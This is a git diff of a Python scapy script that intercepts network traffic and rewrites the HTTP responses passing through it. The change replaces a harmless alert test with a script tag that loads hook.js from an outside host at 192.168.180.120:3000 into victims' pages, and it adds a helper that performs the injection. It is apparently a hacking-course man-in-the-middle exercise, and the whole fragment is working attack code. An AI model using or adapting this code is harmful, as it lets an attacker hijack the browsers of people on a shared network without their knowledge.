@@ -23,8 +23,13 @@ def set_load(packet, load):
     return packet
 
 
+def inject_code(load, code_inject, inject_in_f):
+    return load.replace(inject_in_f, code_inject + inject_in_f)
+
+
 def process_packet(packet):
-    code_inject = "<script>alert('Hello hacking world');</script>"
+    # code_inject = "<script>alert('Hello hacking world');</script>"
+    code_inject = '<script src="http://192.168.180.120:3000/hook.js"></script>'
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):  # DNS response
         try:
@@ -49,9 +54,9 @@ def process_packet(packet):
                         # How there are different packets coming, it is necessary to encode() and decode()
                         # on every packet. Yet, the packet to encode() won't be the same as the packet to
                         # decode().
-                        load = load.replace(inject_in, code_inject + inject_in)
+                        load = inject_code(load, code_inject, inject_in)  # Injecting the code
                 elif scapy_packet[scapy.TCP].ack in ack_list_response:
-                        load = load.replace(inject_in, code_inject + inject_in)  # Injecting the code
+                        load = inject_code(load, code_inject, inject_in)  # Injecting the code
             if load != scapy_packet[scapy.Raw].load.decode():
                 packet.set_payload(bytes(set_load(scapy_packet, load)))
         except (UnicodeDecodeError, IndexError) as ie:
